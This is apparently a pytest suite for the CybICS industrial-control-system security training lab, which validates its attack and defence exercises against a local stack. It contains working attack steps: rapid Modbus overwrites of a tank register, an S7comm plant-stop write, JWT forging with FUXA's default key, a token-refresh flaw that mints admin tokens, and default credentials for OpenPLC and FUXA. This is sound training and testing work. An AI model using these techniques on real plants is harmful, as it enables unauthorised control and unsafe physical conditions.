"""
CybICS Training Test Suite

This test suite validates the training exercises and attack scenarios in CybICS.
It tests defensive security concepts and validates proper system responses to attacks.

Tests include:
- Flood and overwrite attacks on Modbus registers
- System resilience validation
- Attack detection and response verification
"""

import json
import pytest
import time
import os
import requests
from pathlib import Path
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException, ModbusException
from conftest import (SERVER_IP, CONNECTION_TIMEOUT, READ_TIMEOUT, OPENPLC_PORT, FUXA_PORT,
                      S7_SERVER_PORT, NGINX_PROXY_PORT, IDS_PORT, modbus_call)
from dotenv import load_dotenv

# Test Configuration
# Allow SERVER_IP to be overridden via environment variable for remote testing
# Default to localhost for consistency and isolation

MODBUS_PORT = 502

HPT_REGISTER = 1126  # High Pressure Tank register address

# Web service ports


# ===============================================================================
# Flood & Overwrite Training Tests
# ===============================================================================

# These talk to the running stack; the file-existence tests further down do
# not, so the gate sits on the classes rather than the whole module.
@pytest.mark.usefixtures("stack_ready")
class TestFloodOverwrite:
    """
    Tests for the Flood & Overwrite training exercise.

    This training demonstrates how an attacker can continuously flood a PLC
    with malicious Modbus commands to override register values, which can
    lead to unsafe operating conditions in industrial systems.
    """

    @pytest.fixture
    def modbus_client(self):
        """
        Fixture to create and manage Modbus TCP client connection.

        Yields:
            ModbusTcpClient: Configured Modbus TCP client instance
        """
        client = ModbusTcpClient(
            host=SERVER_IP,
            port=MODBUS_PORT,
            timeout=CONNECTION_TIMEOUT
        )
        yield client
        try:
            client.close()
        except Exception:
            pass

    def test_modbus_connection_available(self, modbus_client):
        """
        Test that Modbus TCP connection is available for flood attack training.

        This validates the prerequisite that the OpenPLC server is accessible
        before attempting the flood attack training.
        """
        connection_successful = modbus_client.connect()
        assert connection_successful, (
            f"Failed to connect to Modbus server at {SERVER_IP}:{MODBUS_PORT}. "
            f"Ensure OpenPLC is running and accessible."
        )
        assert modbus_client.is_socket_open(), "Modbus connection appears closed"

    def test_hpt_register_readable(self, modbus_client):
        """
        Test that the HPT (High Pressure Tank) register can be read.

        Validates that register 1126 (HPT) is accessible for reading,
        which is necessary for the flood attack training scenario.
        """
        assert modbus_client.connect(), "Failed to connect to Modbus server"

        try:
            result = modbus_call(
                modbus_client,
                modbus_client.read_holding_registers,
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )

            assert result is not None, "No response from Modbus server"
            assert not result.isError(), f"Error reading HPT register: {result}"
            assert hasattr(result, 'registers'), "Response missing register data"
            assert len(result.registers) == 1, "Expected 1 register in response"

            hpt_value = result.registers[0]
            assert hpt_value is not None, "HPT register value is None"
            assert isinstance(hpt_value, int), f"HPT value should be int, got {type(hpt_value)}"

        except ModbusException as e:
            pytest.fail(f"Modbus exception reading HPT register: {e}")

    def test_hpt_register_writable(self, modbus_client):
        """
        Test that the HPT register can be written to.

        Validates that register 1126 (HPT) is writable, which is the
        target of the flood attack in the training scenario.

        Note: The HPT value may be overwritten by the PLC logic quickly,
        so we just verify the write succeeds, not persistence.
        """
        assert modbus_client.connect(), "Failed to connect to Modbus server"

        test_value = 50

        try:
            # Read original value
            read_result = modbus_call(
                modbus_client,
                modbus_client.read_holding_registers,
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )
            assert not read_result.isError(), f"Error reading HPT register: {read_result}"

            # Write test value - just verify write succeeds
            write_result = modbus_call(
                modbus_client,
                modbus_client.write_register,
                address=HPT_REGISTER,
                value=test_value,
                device_id=1
            )

            assert write_result is not None, "No response from write operation"

            if write_result.isError():
                error_msg = str(write_result)
                if "Connection unexpectedly closed" in error_msg or "Connection" in error_msg:
                    pytest.fail(f"Modbus write rejected by the server: {error_msg}")
                else:
                    pytest.fail(f"Error writing to HPT register: {write_result}")

            # Write operation succeeded - this is sufficient for the test
            # Note: We don't verify the value persists because the PLC logic
            # is continuously updating this register based on the simulation

        except ConnectionException as e:
            pytest.fail(f"Modbus connection failed during the write test: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during write test: {e}")

    def test_flood_attack_simulation(self, modbus_client):
        """
        Test a brief simulation of the flood attack.

        Performs a short burst of rapid writes to the HPT register to simulate
        the flood attack behavior described in the training. This validates that:
        1. Rapid writes are possible (demonstrating vulnerability)
        2. The system accepts continuous write commands
        3. The attack pattern is executable

        Note: This is a brief test simulation (1 second), not a full attack.
        """
        assert modbus_client.connect(), "Failed to connect to Modbus server"

        flood_value = 10
        flood_duration = 1.0  # seconds
        write_delay = 0.001  # 1ms between writes (same as training script)

        try:
            # Read original value to restore later
            read_result = modbus_call(
                modbus_client,
                modbus_client.read_holding_registers,
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )
            assert not read_result.isError(), "Cannot read original HPT value"
            original_value = read_result.registers[0]

            # Perform flood simulation
            start_time = time.time()
            write_count = 0
            failed_writes = 0

            while (time.time() - start_time) < flood_duration:
                try:
                    result = modbus_call(
                        modbus_client,
                        modbus_client.write_register,
                        address=HPT_REGISTER,
                        value=flood_value,
                        device_id=1
                    )

                    if result and not result.isError():
                        write_count += 1
                    else:
                        failed_writes += 1

                    time.sleep(write_delay)

                except Exception as e:
                    failed_writes += 1
                    # Continue flooding despite errors
                    if not modbus_client.is_socket_open():
                        if not modbus_client.connect():
                            break

            elapsed_time = time.time() - start_time

            # Restore original value
            if modbus_client.is_socket_open():
                modbus_client.write_register(
                    address=HPT_REGISTER,
                    value=original_value,
                    device_id=1
                )

            # Validate flood attack was possible
            assert write_count > 0, "No successful writes during flood simulation"

            writes_per_second = write_count / elapsed_time

            # Should achieve at least 20 writes/second (lower threshold for Raspberry Pi)
            assert writes_per_second >= 20, (
                f"Flood attack rate too low: {writes_per_second:.1f} writes/sec. "
                f"Expected at least 20 writes/sec for effective flooding."
            )

            # Log results for analysis
            print(f"\nFlood Attack Simulation Results:")
            print(f"  Duration: {elapsed_time:.2f} seconds")
            print(f"  Successful writes: {write_count}")
            print(f"  Failed writes: {failed_writes}")
            print(f"  Write rate: {writes_per_second:.1f} writes/second")
            print(f"  Success rate: {write_count/(write_count+failed_writes)*100:.1f}%")

        except ConnectionException as e:
            pytest.fail(f"Modbus connection failed during the flood simulation: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during flood simulation: {e}")

    def test_hpt_register_persistence(self, modbus_client):
        """
        Test that HPT register can be written multiple times rapidly.

        This validates that the flood attack can continuously write to the HPT
        register, which is the key capability needed for the attack to work.

        Note: We don't expect values to persist because the PLC logic continuously
        updates this register. Instead, we verify that rapid successive writes
        are accepted by the server.
        """
        assert modbus_client.connect(), "Failed to connect to Modbus server"

        test_values = [10, 50, 100, 200]
        successful_writes = 0

        try:
            for test_value in test_values:
                # Write value
                write_result = modbus_call(
                    modbus_client,
                    modbus_client.write_register,
                    address=HPT_REGISTER,
                    value=test_value,
                    device_id=1
                )

                if write_result.isError():
                    pytest.fail(f"Modbus write rejected by the server: {write_result}")

                successful_writes += 1

                # Small delay between writes
                time.sleep(0.01)

            # Verify we successfully wrote all test values
            assert successful_writes == len(test_values), (
                f"Only {successful_writes}/{len(test_values)} writes succeeded"
            )

        except ConnectionException as e:
            pytest.fail(f"Modbus connection failed during the write test: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during write test: {e}")


# ===============================================================================
# S7 Side Door Training Tests
# ===============================================================================

# OpenPLC's Snap7 server: %MW memory is data block DB1002, two bytes per word.
S7_MEMORY_DB = 1002
S7_STOP_OFFSET = 208     # %MW104, Modbus holding register 1128
S7_MANUAL_OFFSET = 212   # %MW106, Modbus holding register 1130
STOP_REGISTER = 1128
MANUAL_REGISTER = 1130


class _CtfProgress:
    """Save and restore the board's CTF progress around a verify test.

    A successful POST /ctf/verify/<id> records the solve, and on a challenge
    that is already solved it answers "already solved" without running the
    check. A test takes its challenges out of the progress first and puts the
    progress back exactly as it was afterwards: /ctf/reset, then the recorded
    flags submitted again in their original order. A board connected to a
    CybICS-mgmt event would report those re-submissions; do not run the suite
    against one.
    """

    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"

    def _progress(self):
        r = requests.get(f"{self.BASE}/ctf/progress", timeout=READ_TIMEOUT)
        assert r.status_code == 200, r.text[:200]
        return list(r.json()["solved_challenge_ids"]), r.json()["total_points"]

    def _set_progress(self, solved):
        """Make the board's solved list exactly `solved`, in that order."""
        config = Path(__file__).resolve().parent.parent / "software" / "landing" / "ctf_config.json"
        flags = {c["id"]: c["flag"] for cat in json.loads(config.read_text())["categories"].values()
                 for c in cat["challenges"]}
        assert requests.post(f"{self.BASE}/ctf/reset", timeout=READ_TIMEOUT).json()["success"]
        for challenge_id in solved:
            r = requests.post(f"{self.BASE}/ctf/submit", timeout=READ_TIMEOUT,
                              json={"challenge_id": challenge_id, "flag": flags[challenge_id]})
            assert r.json().get("success"), f"could not restore {challenge_id}: {r.text[:200]}"

    def _without(self, *challenge_ids):
        """Take challenge_ids out of the progress; return the progress before."""
        before = self._progress()
        if any(c in before[0] for c in challenge_ids):
            self._set_progress([c for c in before[0] if c not in challenge_ids])
        return before

    def _restore(self, before):
        if self._progress() != before:
            self._set_progress(before[0])
        assert self._progress() == before, "the board's CTF progress was not restored"


@pytest.mark.usefixtures("stack_ready")
class TestS7SideDoor(_CtfProgress):
    """
    The S7 Side Door challenge end to end: stop the plant with an S7comm
    write to OpenPLC's port 102, see the IDS name the write, get the flag
    from the landing page's verify route, and put the plant back.

    Before the real solve it replays the hole an earlier version of the check
    had: an S7 stop, an S7 restore, then a stop over Modbus. Verify must refuse
    that, because only the newest S7 write of the flag counts.

    The plant is restored in a finally block, whatever fails, because a
    stopped plant would break the other challenges and later tests. The run
    leaves its s7_write alerts in the IDS buffer; the last one that touches
    the stop flag writes 0, so it does not pre-arm the challenge for anyone.

    A successful POST /ctf/verify/<id> also records the solve, and on a
    challenge that is already solved it answers "already solved" without
    running the check. So the board's CTF progress is read first, the
    challenge is taken out of it if needed, and afterwards the progress is put
    back exactly as it was: /ctf/reset, then the recorded flags submitted again
    in their original order. A board connected to a CybICS-mgmt event would
    report those re-submissions; do not run the suite against one.
    """

    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"
    IDS = f"http://{SERVER_IP}:{IDS_PORT}"

    @staticmethod
    def _s7_client():
        import snap7  # tests/requirements.txt; a missing library is a failure, not a skip
        client = snap7.client.Client()
        client.connect(SERVER_IP, 0, 1, S7_SERVER_PORT)
        return client

    @staticmethod
    def _s7_write(client, offset, value):
        client.db_write(S7_MEMORY_DB, offset, bytearray(value.to_bytes(2, "big")))

    @staticmethod
    def _modbus_words():
        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
        try:
            assert client.connect(), "Modbus not reachable to check the plant state"
            result = modbus_call(client, client.read_holding_registers, STOP_REGISTER, count=3)
            assert not result.isError(), result
            return result.registers[0], result.registers[2]   # stop, manual
        finally:
            client.close()

    @staticmethod
    def _modbus_write_stop(value):
        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
        try:
            assert client.connect(), "Modbus not reachable to write the stop flag"
            result = modbus_call(client, client.write_register, STOP_REGISTER, value)
            assert not result.isError(), result
        finally:
            client.close()

    def _verify(self):
        r = requests.post(f"{self.BASE}/ctf/verify/s7_sidedoor", json={}, timeout=30)
        assert r.status_code == 200, r.text[:300]
        return r.json()

    def _ids_last_alert_id(self):
        alerts = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
        return max((a["id"] for a in alerts), default=0)

    def test_stop_over_s7_is_detected_and_verified_then_restored(self):
        progress_before = self._progress()
        if "s7_sidedoor" in progress_before[0]:
            self._set_progress([c for c in progress_before[0] if c != "s7_sidedoor"])
        try:
            self._stop_verify_restore()
        finally:
            if self._progress() != progress_before:
                self._set_progress(progress_before[0])
        assert self._progress() == progress_before, "the board's CTF progress was not restored"

    def _stop_verify_restore(self):
        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
        was_active = status.get("active", False)
        if not was_active:
            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
            time.sleep(2)
        before = self._ids_last_alert_id()

        client = self._s7_client()
        try:
            stop_before, manual_before = self._modbus_words()
            assert (stop_before, manual_before) == (0, 0), (
                "the plant was not in automatic operation before the test")

            # A running plant does not pass.
            result = self._verify()
            assert not result["success"] and "flag" not in result, result

            # An S7 stop that was restored over S7 does not cover a later
            # stop by another route (here Modbus FC06 to HR1128).
            self._s7_write(client, S7_STOP_OFFSET, 1)
            self._s7_write(client, S7_STOP_OFFSET, 0)
            time.sleep(2)   # let the IDS log both writes
            self._modbus_write_stop(1)
            assert self._modbus_words()[0] == 1
            result = self._verify()
            assert not result["success"] and "flag" not in result, result
            assert "put 0 back" in json.dumps(result["checks"]), result
            self._modbus_write_stop(0)

            # The attack: one S7comm WriteVar of 1 to DB1002.DBW208.
            self._s7_write(client, S7_STOP_OFFSET, 1)
            assert self._modbus_words()[0] == 1, "the S7 write did not reach the PLC's %MW104"

            # The IDS saw it as a write and decoded where it went. Every
            # change of value is a new alert, so this one is after `before`.
            deadline = time.time() + 10
            writes = []
            while time.time() < deadline and len(writes) < 2:
                alerts = requests.get(f"{self.IDS}/api/alerts", params={"since_id": before},
                                      timeout=READ_TIMEOUT).json()["alerts"]
                writes = [a for a in alerts if a["rule"] == "s7_write"
                          and any(i["db"] == S7_MEMORY_DB and i["start"] == S7_STOP_OFFSET
                                  and i["data"] == "0001" for i in a.get("s7_items", []))]
                time.sleep(0.5)
            assert len(writes) == 2, f"expected two s7_write alerts setting the stop flag: {writes}"
            assert writes[-1]["dst"] == "172.18.0.3" and writes[-1]["dport"] == 102

            # The challenge: verify passes and hands out the flag.
            result = self._verify()
            assert result["success"], result
            assert result.get("flag", "").startswith("CybICS(")
        finally:
            # Restore whatever failed above, over S7 so the newest s7_write
            # alert for the flag is a 0.
            self._s7_write(client, S7_STOP_OFFSET, 0)
            self._s7_write(client, S7_MANUAL_OFFSET, 0)
            client.disconnect()
            if not was_active:
                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)

        assert self._modbus_words() == (0, 0), "stop and manual are not back to 0"


# ===============================================================================
# Forged HMI Token / Rotate the FUXA Token Key
# ===============================================================================

def _fuxa_forge(payload, secret="frangoteam751"):
    """An HS256 JWT, built independently of the landing module under test."""
    import base64
    import hashlib
    import hmac

    def b64(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    signature = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
    return f"{header}.{body}.{b64(signature)}"


def _readme_command(module, marker):
    """The first line of a fenced command in training/<module>/README.md containing marker."""
    readme = Path(__file__).resolve().parent.parent / "training" / module / "README.md"
    for line in readme.read_text(encoding="utf-8").splitlines():
        if marker in line:
            return line.strip()
    raise AssertionError(f"{module}/README.md has no command with {marker!r}")


@pytest.mark.usefixtures("stack_ready")
class TestFuxaJwt(_CtfProgress):
    """
    Both FUXA token challenges end to end.

    The attack forges an administrator token for a made-up user with FUXA's
    default key and pastes it into the landing page's verify route, which must
    hand out the flag, after refusing a token for a real account, one signed
    with a wrong key, one shaped exactly like a token FUXA issues itself and
    one FUXA's unauthenticated token refresh signed. Both tests also
    pin that refresh flaw before and after the key rotation, as the READMEs
    describe it, so a FUXA upgrade that changes it is noticed.

    The defence runs the README's commands through the landing page's admin
    shell (POST /api/webshell/execute, the route the WebShell page uses): back
    up settings.js, add a random secretCode, check the file loads, restart
    FUXA. Verify must then pass and the forged token must be refused. A finally
    block puts the original settings.js back and restarts FUXA, whatever
    failed, so the default key works again for the attack test, the Harden
    FUXA Credentials check and every later test. The admin password is never
    touched; the test asserts that its state is the same before and after.
    """

    FUXA = f"http://{SERVER_IP}:{FUXA_PORT}"
    BACKUP = "/_appdata/settings.js.cybics-test"

    # --- helpers ---------------------------------------------------------

    def _admin(self, command, timeout=90):
        """Run command in the admin shell; return (exit code, output)."""
        r = requests.post(f"{self.BASE}/api/webshell/execute", json={"command": command},
                          timeout=READ_TIMEOUT)
        assert r.status_code == 200 and r.json().get("success"), r.text[:200]
        job, output, offset = r.json()["job_id"], "", 0
        deadline = time.time() + timeout
        while time.time() < deadline:
            state = requests.get(f"{self.BASE}/api/webshell/jobs/{job}", params={"offset": offset},
                                 timeout=READ_TIMEOUT).json()
            output += state["chunk"]
            offset = state["offset"]
            if not state["running"]:
                return state["exit_code"], output
            time.sleep(0.5)
        pytest.fail(f"admin shell command did not finish: {command}")

    def _container(self):
        code, out = self._admin("docker ps --filter name=fuxa --format '{{.Names}}'")
        names = [n for n in out.split() if "fuxa" in n]
        assert code == 0 and names, f"no FUXA container: {out!r}"
        return names[0]

    def _fuxa_ready(self, timeout=120):
        """Wait until FUXA serves its API with authentication on."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                settings = requests.get(f"{self.FUXA}/api/settings", timeout=READ_TIMEOUT)
                users = requests.get(f"{self.FUXA}/api/users", timeout=READ_TIMEOUT)
                if settings.status_code == 200 and users.status_code == 401:
                    return
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        pytest.fail("FUXA did not come back with authentication on")

    def _restart_fuxa(self, container):
        code, out = self._admin(f"docker restart {container}")
        assert code == 0, out
        time.sleep(3)
        self._fuxa_ready()

    def _users_status(self, token):
        return requests.get(f"{self.FUXA}/api/users", headers={"x-access-token": token},
                            timeout=READ_TIMEOUT).status_code

    def _refresh_mint(self):
        """FUXA 1.2.6's unauthenticated token refresh, as documented in the READMEs.

        An invalid token skips the x-auth-user check in verifyToken, and the
        heartbeat refresh signs {id, groups} straight from that header. If a
        FUXA upgrade closes or changes this, the assertions using it fail:
        then update training/fuxa_jwt/README.md, defense_fuxa_jwt/README.md,
        both Theory lessons and the docstrings of _fuxa_jwt.fuxa_could_issue.
        """
        r = requests.post(f"{self.FUXA}/api/heartbeat", json={"params": True}, timeout=READ_TIMEOUT,
                          headers={"x-access-token": "garbage",
                                   "x-auth-user": json.dumps({"user": "cybics-test-refresh",
                                                              "groups": -1})})
        assert r.status_code == 200 and r.json().get("message") == "tokenRefresh", (
            f"FUXA's documented token-refresh flaw no longer behaves as described: "
            f"{r.status_code} {r.text[:200]}")
        return r.json()["token"]

    def _default_password_works(self):
        r = requests.post(f"{self.FUXA}/api/signin", json={"username": "admin", "password": "123456"},
                          timeout=READ_TIMEOUT)
        return r.status_code == 200 and "error" not in r.text.lower() and r.text.strip() != ""

    def _verify(self, challenge_id, answers=None):
        body = {"answers": answers} if answers is not None else {}
        r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json=body, timeout=60)
        assert r.status_code == 200, r.text[:300]
        return r.json()

    # --- the attack ------------------------------------------------------

    def test_forged_token_is_verified(self):
        before = self._without("fuxa_jwt")
        try:
            ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
            assert self._users_status(ghost) == 200, "FUXA refuses a token signed with its default key"

            now = int(time.time())
            refused = {
                "real account": _fuxa_forge({"id": "admin", "groups": -1}),
                "wrong key": _fuxa_forge({"id": "cybics-test-ghost", "groups": -1}, "not the key"),
                "FUXA-issued shape": _fuxa_forge({"id": "cybics-test-ghost", "groups": -1,
                                                  "iat": now, "exp": now + 3600}),
            }
            # Documented in the READMEs: FUXA signs an admin token for anyone,
            # without key or password. It works, and verify must refuse it.
            minted = self._refresh_mint()
            assert self._users_status(minted) == 200, "FUXA's refresh token is not an admin token"
            refused["FUXA token refresh"] = minted
            for case, token in refused.items():
                result = self._verify("fuxa_jwt", {"token": token})
                assert not result["success"] and "flag" not in result, (case, result)

            result = self._verify("fuxa_jwt", {"token": ghost})
            assert result["success"], result
            assert result.get("flag", "").startswith("CybICS(")
        finally:
            self._restore(before)

    # --- the defence -----------------------------------------------------

    def test_rotated_key_passes_the_defence_and_stops_the_attack(self):
        before = self._without("defense_fuxa_jwt", "fuxa_jwt")
        password_state = self._default_password_works()
        container = self._container()
        code, out = self._admin(f"docker exec {container} cp /_appdata/settings.js {self.BACKUP}")
        assert code == 0, out
        try:
            result = self._verify("defense_fuxa_jwt")
            assert not result["success"] and "flag" not in result, result

            # README step 3, verbatim but for the container name.
            add_key = _readme_command("defense_fuxa_jwt", "KEY=$(").replace("<fuxa>", container)
            code, out = self._admin(add_key)
            assert code == 0, out
            # README step 4: the file still loads, with a 48-character key.
            code, out = self._admin(
                f"docker exec {container} node -e \"const s=require('/_appdata/settings.js'); "
                f"console.log('ok, key length', s.secretCode.length)\"")
            assert code == 0 and "ok, key length 48" in out, out

            self._restart_fuxa(container)

            ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
            assert self._users_status(ghost) == 401, "a token signed with the default key still works"
            result = self._verify("fuxa_jwt", {"token": ghost})
            assert not result["success"] and "flag" not in result, result

            # What defense_fuxa_jwt/README.md says the key does not fix: the
            # refresh flaw still mints an admin token, now with the new key,
            # and the attack's verify still refuses it.
            minted = self._refresh_mint()
            assert self._users_status(minted) == 200, "the refresh flaw no longer works after rotation"
            result = self._verify("fuxa_jwt", {"token": minted})
            assert not result["success"] and "flag" not in result, result

            result = self._verify("defense_fuxa_jwt")
            assert result["success"], result
            assert result.get("flag", "").startswith("CybICS(")
        finally:
            code, out = self._admin(f"docker exec {container} mv {self.BACKUP} /_appdata/settings.js")
            self._restart_fuxa(container)
            assert code == 0, f"settings.js not restored: {out}"
            self._restore(before)

        ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
        assert self._users_status(ghost) == 200, "FUXA is not back on its default key"
        assert self._default_password_works() == password_state, "the FUXA admin password state changed"


# ===============================================================================
# Password Attack Training Tests
# ===============================================================================

# These talk to the running stack; the file-existence tests further down do
# not, so the gate sits on the classes rather than the whole module.
@pytest.mark.usefixtures("stack_ready")
class TestPasswordAttack:
    """
    Tests for the Password Attack training exercise.

    This training demonstrates dictionary/brute force attacks against
    web authentication systems in industrial control systems.
    """

    def test_openplc_login_page_accessible(self):
        """
        Test that OpenPLC login page is accessible.

        Validates that the OpenPLC web interface is available for
        password attack testing.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        try:
            response = requests.get(url, timeout=5)
            assert response.status_code == 200, (
                f"OpenPLC login page returned status {response.status_code}"
            )
            assert 'login' in response.text.lower(), (
                "OpenPLC login page missing login form"
            )
        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_openplc_invalid_credentials_rejected(self):
        """
        Test that OpenPLC rejects invalid credentials.

        Validates that the authentication system is working and
        rejects wrong passwords.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        # Test with clearly invalid credentials
        payload = {
            'username': 'admin',
            'password': 'definitely_wrong_password_12345'
        }

        try:
            response = requests.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=5,
                allow_redirects=False
            )

            # Should not redirect to dashboard (302) or return success (200 with dashboard)
            if response.status_code == 302:
                assert '/login' in response.headers.get('Location', ''), (
                    "Invalid credentials were accepted"
                )
            else:
                # Check response doesn't contain dashboard elements
                assert 'logout' not in response.text.lower(), (
                    "Invalid credentials appear to have been accepted"
                )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_openplc_valid_credentials_accepted(self):
        """
        Test that OpenPLC accepts valid credentials.

        Validates that the default credentials work, which is important
        for the training scenario (demonstrating weak passwords).
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        # Default OpenPLC credentials (commonly known)
        payload = {
            'username': 'openplc',
            'password': 'openplc'
        }

        try:
            response = requests.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=5,
                allow_redirects=True
            )

            # Should successfully log in
            assert response.status_code == 200, (
                f"Login failed with status {response.status_code}"
            )

            # Check for indicators of successful login
            assert any(indicator in response.text.lower() for indicator in
                      ['logout', 'dashboard', 'programs', 'hardware']), (
                "Login appears to have failed - no dashboard elements found"
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_fuxa_api_accessible(self):
        """
        Test that FUXA web interface is accessible.

        Validates that the FUXA service is running and available for
        password attack testing.
        """
        # Test main FUXA page first
        url = f"http://{SERVER_IP}:{FUXA_PORT}/"

        try:
            response = requests.get(url, timeout=5)
            assert response.status_code == 200, (
                f"FUXA web interface returned status {response.status_code}"
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_fuxa_invalid_credentials_rejected(self):
        """
        Test that FUXA rejects invalid credentials.

        Validates that the authentication system is working and
        rejects wrong passwords.
        """
        url = f"http://{SERVER_IP}:{FUXA_PORT}/api/signin"

        # Test with clearly invalid credentials
        payload = {
            'username': 'admin',
            'password': 'definitely_wrong_password_12345'
        }

        try:
            response = requests.post(
                url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )

            # Should return error
            assert response.status_code in [401, 403, 400], (
                f"Expected auth error status, got {response.status_code}"
            )

            # Check response indicates error
            try:
                data = response.json()
                assert 'error' in str(data).lower() or 'token' not in data, (
                    "Invalid credentials appear to have been accepted"
                )
            except:
                # Response might not be JSON, that's okay
                pass

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_fuxa_valid_credentials_accepted(self):
        """
        Test that FUXA accepts valid credentials.

        Validates that the default credentials work, which is important
        for the training scenario (demonstrating weak passwords).
        """
        url = f"http://{SERVER_IP}:{FUXA_PORT}/api/signin"

        # Try multiple known FUXA default credentials
        credentials_to_try = [
            {'username': 'operator', 'password': 'operator'},
            {'username': 'viewer', 'password': 'viewer'},
            {'username': 'admin', 'password': 'admin'}
        ]

        successful_login = False

        try:
            for payload in credentials_to_try:
                response = requests.post(
                    url,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )

                # Check if login succeeded
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'success' and 'token' in data.get('data', {}):
                            successful_login = True
                            break
                    except ValueError:
                        pass

            assert successful_login, (
                "None of the default FUXA credentials worked. Tried: " +
                ", ".join([f"{c['username']}/{c['password']}" for c in credentials_to_try])
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_password_attack_rate_limiting(self):
        """
        Test rapid authentication attempts (password attack simulation).

        Validates that multiple rapid login attempts can be made,
        which is necessary for dictionary/brute force attacks.
        This also checks if any rate limiting is in place.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        attempts = 5
        successful_attempts = 0

        try:
            for i in range(attempts):
                payload = {
                    'username': 'admin',
                    'password': f'test_password_{i}'
                }

                response = requests.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=5,
                    allow_redirects=False
                )

                # Just verify we can make the request
                if response.status_code in [200, 302, 401, 403]:
                    successful_attempts += 1

                # Small delay between attempts
                time.sleep(0.1)

            # Should be able to make all attempts
            assert successful_attempts == attempts, (
                f"Only {successful_attempts}/{attempts} login attempts succeeded. "
                f"Server may be blocking rapid requests."
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Connection lost during rapid login attempts")
        except requests.exceptions.Timeout:
            pytest.fail(f"Timeout during rapid login attempts")


# ===============================================================================
# Training Exercise Validation
# ===============================================================================

def test_flood_attack_script_exists():
    """
    Verify that the flood attack training script exists.

    Ensures the training materials are properly set up in the repository.
    """
    script_path = Path(__file__).parent.parent / 'training' / 'flood_overwrite' / 'flooding_hpt.py'
    assert script_path.exists(), (
        f"Flood attack training script not found at {script_path}"
    )

    # Verify script is readable and contains expected content
    content = script_path.read_text()
    assert 'ModbusTcpClient' in content, "Script missing Modbus client import"
    assert 'write_register' in content, "Script missing write_register call"
    assert '1126' in content, "Script missing HPT register address (1126)"


def test_flood_attack_readme_exists():
    """
    Verify that the flood attack training README exists.

    Ensures training documentation is available for users.
    """
    readme_path = Path(__file__).parent.parent / 'training' / 'flood_overwrite' / 'README.md'
    assert readme_path.exists(), (
        f"Flood attack training README not found at {readme_path}"
    )

    # Verify README contains expected sections
    content = readme_path.read_text()
    assert 'Flood' in content or 'flood' in content, "README missing flood attack content"
    # The flood flag is earned by performing the attack and clicking Verify, not
    # quoted in the README, so check the README documents that flow.
    assert 'Verify' in content, "README missing the verification step for the flag"


def test_dev_env_file_exists():
    """
    Verify that .dev.env file exists for training configuration.

    The flood attack script requires this file to get the DEVICE_IP.
    Note: Tests always run against localhost, but the training script
    uses .dev.env for flexible targeting.
    """
    dev_env_path = Path(__file__).parent.parent / '.dev.env'

    if not dev_env_path.exists():
        pytest.skip(
            f".dev.env file not found at {dev_env_path}. "
            f"This file is needed for training scripts to locate the device."
        )

    # Verify DEVICE_IP is set
    content = dev_env_path.read_text()
    assert 'DEVICE_IP' in content, ".dev.env missing DEVICE_IP configuration"


def test_password_attack_readme_exists():
    """
    Verify that the password attack training README exists.

    Ensures training documentation is available for users.
    """
